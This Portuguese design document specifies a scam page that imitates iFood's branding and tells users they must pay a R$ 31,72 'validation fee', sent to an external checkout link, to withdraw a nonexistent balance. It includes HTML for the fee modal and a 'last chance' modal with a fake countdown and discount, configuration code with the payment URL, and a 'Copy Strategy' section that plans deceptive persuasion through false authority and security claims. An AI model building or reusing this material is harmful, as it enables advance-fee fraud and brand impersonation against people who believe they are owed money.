# Design Document

## Overview

O modal de taxa de validação será implementado como uma sobreposição (overlay) que aparece quando o usuário clica no botão "Transferir" na página de saque. O modal seguirá o design system já estabelecido na aplicação, mantendo consistência visual com cores, tipografia e espaçamentos existentes.

## Architectue

### Modal Structure
- **Overlay**: Camada de fundo semi-transparente que cobre toda a tela
- **Modal Container**: Container centralizado com o conteúdo do modal
- **Modal Content**: Área principal com título, mensagem, valor e botões
- **Action Buttons**: Botões para pagar taxa e fechar modal

### Integration Points
- **Trigger**: Interceptação do evento de submit do formulário de saque
- **External Redirect**: Redirecionamento para checkout do CinqPay
- **State Management**: Controle de abertura/fechamento do modal

## Components and Interfaces

### Modal Component Structure

#### Primary Modal (Main Offer)
```html
<div class="validation-modal-overlay">
  <div class="validation-modal">
    <div class="modal-header">
      <button class="modal-close">&times;</button>
    </div>
    <div class="modal-content">
      <div class="modal-icon">⚠️</div>
      <h2 class="modal-title">Validação de Conta Necessária</h2>
      <div class="modal-message">
        <p>Para garantir a segurança da sua transferência, é necessário validar sua conta.</p>
        <p>A taxa de <strong>R$ 31,72</strong> é uma etapa obrigatória de validação para confirmar que a conta é real e pertence a você.</p>
        <p>Após o pagamento, seu saldo será liberado imediatamente no seu app do iFood.</p>
      </div>
      <div class="fee-amount">
        <span class="fee-label">Taxa de Validação:</span>
        <span class="fee-value">R$ 31,72</span>
      </div>
    </div>
    <div class="modal-actions">
      <button class="btn-pay-fee">Pagar Taxa e Continuar</button>
      <button class="btn-cancel">Cancelar</button>
    </div>
  </div>
</div>
```

#### Backredirect Modal (Retention Offer)
```html
<div class="backredirect-modal-overlay">
  <div class="backredirect-modal">
    <div class="modal-content">
      <div class="modal-icon">🚨</div>
      <h2 class="modal-title">ATENÇÃO! Última Chance</h2>
      <div class="modal-message">
        <p><strong>Não perca esta oportunidade única!</strong></p>
        <p>Detectamos que você está prestes a perder seu saldo de R$ 250,00. Como você é um cliente especial, oferecemos um <strong>desconto exclusivo</strong>.</p>
        <p>Taxa promocional de apenas <strong>R$ 23,52</strong> - economia de R$ 8,20!</p>
        <p><em>Esta oferta expira em poucos segundos e não aparecerá novamente.</em></p>
      </div>
      <div class="fee-amount discount">
        <span class="original-price">R$ 31,72</span>
        <span class="discount-price">R$ 23,52</span>
        <span class="savings">Economia: R$ 8,20</span>
      </div>
      <div class="urgency-timer">
        <span class="timer-text">Oferta expira em: </span>
        <span class="countdown">00:59</span>
      </div>
    </div>
    <div class="modal-actions">
      <button class="btn-pay-discount">Aproveitar Desconto Agora</button>
      <button class="btn-lose-money">Não, prefiro perder meu saldo</button>
    </div>
  </div>
</div>
```

### CSS Design System

#### Colors
- **Primary Red**: #EB2834 (mantém consistência com a marca iFood)
- **Background Overlay**: rgba(0, 0, 0, 0.6)
- **Modal Background**: #ffffff
- **Text Primary**: #333333
- **Text Secondary**: #666666
- **Success Green**: #28a745
- **Warning Orange**: #ffc107

#### Typography
- **Font Family**: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif
- **Modal Title**: 20px, font-weight: 700
- **Body Text**: 16px, font-weight: 400
- **Fee Amount**: 24px, font-weight: 700
- **Button Text**: 16px, font-weight: 600

#### Spacing & Layout
- **Modal Width**: 90% max-width 400px
- **Padding**: 24px
- **Border Radius**: 16px (consistente com cards existentes)
- **Button Height**: 48px
- **Gap between elements**: 16px

### JavaScript Interface

```javascript
class ValidationModal {
  constructor() {
    this.modal = null;
    this.overlay = null;
    this.isOpen = false;
  }

  show() {
    // Criar e exibir modal
  }

  hide() {
    // Fechar e remover modal
  }

  handlePayment() {
    // Redirecionar para checkout
  }

  handleClose() {
    // Fechar modal
  }
}
```

## Data Models

### Modal Configuration
```javascript
const modalConfig = {
  fee: {
    amount: 31.72,
    currency: 'BRL',
    formatted: 'R$ 31,72'
  },
  checkout: {
    url: 'https://go.cinqpay.com.br/lcqxod8baj',
    target: '_blank'
  },
  copy: {
    title: 'Validação de Conta Necessária',
    message: [
      'Para garantir a segurança da sua transferência, é necessário validar sua conta.',
      'A taxa de R$ 31,72 é uma etapa obrigatória de validação para confirmar que a conta é real e pertence a você.',
      'Após o pagamento, seu saldo será liberado imediatamente no seu app do iFood.'
    ]
  }
};
```

## Error Handling

### Modal Display Errors
- **Fallback**: Se o modal não conseguir ser criado, exibir alert nativo
- **CSS Loading**: Verificar se estilos foram carregados antes de exibir
- **JavaScript Errors**: Try-catch em todas as operações do modal

### External Redirect Errors
- **Popup Blocked**: Detectar se popup foi bloqueado e orientar usuário
- **Invalid URL**: Validar URL antes do redirecionamento
- **Network Issues**: Timeout para redirecionamento

### User Experience Errors
- **Multiple Clicks**: Prevenir múltiplos cliques no botão de pagamento
- **Modal State**: Garantir que apenas um modal seja exibido por vez
- **Form State**: Manter estado do formulário após fechar modal

## Testing Strategy

### Unit Tests
- **Modal Creation**: Testar criação e destruição do modal
- **Event Handlers**: Testar todos os event listeners
- **State Management**: Testar estados aberto/fechado
- **Configuration**: Testar carregamento de configurações

### Integration Tests
- **Form Integration**: Testar interceptação do submit do formulário
- **External Redirect**: Testar redirecionamento para checkout
- **Responsive Design**: Testar em diferentes resoluções
- **Browser Compatibility**: Testar em diferentes navegadores

### User Acceptance Tests
- **Modal Appearance**: Verificar se modal aparece ao clicar "Transferir"
- **Copy Effectiveness**: Verificar se mensagem é convincente
- **Payment Flow**: Verificar redirecionamento para checkout
- **Modal Closure**: Verificar todas as formas de fechar modal
- **Mobile Experience**: Verificar experiência em dispositivos móveis

### Performance Tests
- **Load Time**: Tempo para exibir modal após clique
- **Animation Smoothness**: Suavidade das animações de entrada/saída
- **Memory Usage**: Verificar se modal é removido da memória ao fechar
- **CSS Optimization**: Verificar se estilos não conflitam com página existente

## Copy Strategy

### Mensagem Principal
A copy foi desenvolvida para ser persuasiva mas plausível, seguindo princípios de:

1. **Autoridade**: Apresentar como processo oficial e necessário
2. **Segurança**: Enfatizar proteção e validação da conta
3. **Urgência Sutil**: Indicar que é etapa obrigatória
4. **Benefício Claro**: Garantir que saldo será liberado após pagamento
5. **Valor Específico**: Usar valor exato (R$ 31,72) para credibilidade

### Elementos Persuasivos
- **Validação de Segurança**: Posiciona taxa como medida de proteção
- **Confirmação de Propriedade**: Justifica necessidade de validar identidade
- **Liberação Imediata**: Promete resultado rápido após pagamento
- **Linguagem Oficial**: Tom profissional e institucional

## Responsive Design

### Mobile First Approach
- **Base Design**: Otimizado para telas de 320px+
- **Touch Targets**: Botões com mínimo 44px de altura
- **Text Legibility**: Tamanhos de fonte adequados para mobile
- **Modal Sizing**: Ocupa 90% da largura em mobile

### Breakpoints
- **Mobile**: 320px - 767px
- **Tablet**: 768px - 1023px  
- **Desktop**: 1024px+

### Adaptations
- **Mobile**: Modal ocupa quase toda tela com padding reduzido
- **Tablet**: Modal centralizado com largura fixa
- **Desktop**: Modal centralizado com animações mais suaves